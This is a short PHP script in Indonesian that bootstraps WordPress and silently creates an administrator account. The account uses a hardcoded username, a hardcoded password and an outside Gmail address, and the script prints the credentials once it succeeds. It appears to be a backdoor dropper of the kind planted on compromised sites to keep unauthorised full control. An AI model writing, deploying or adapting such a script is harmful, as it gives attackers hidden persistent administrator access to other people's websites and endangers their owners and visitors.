<?php
define('WP_USE_THEMES', false);
require_once('./wp-load.php');

$username = 'webmaster';
$password = 'Seo301Take!';
$email = 'boletinluzendesa@gmail.com';

if (!username_exists($username) && !email_exists($email)) {
    $user_id = wp_create_user($username, $password, $email);
    
    if (!is_wp_error($user_id)) {
        // Set role sebagai administrator
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        
        echo "User admin berhasil dibuat!";
        echo "Username: " . $username;
        echo "Password: " . $password;
    } else {
        echo "Error: " . $user_id->get_error_message();
    }
} else {
    echo "User sudah ada!";
}

?>



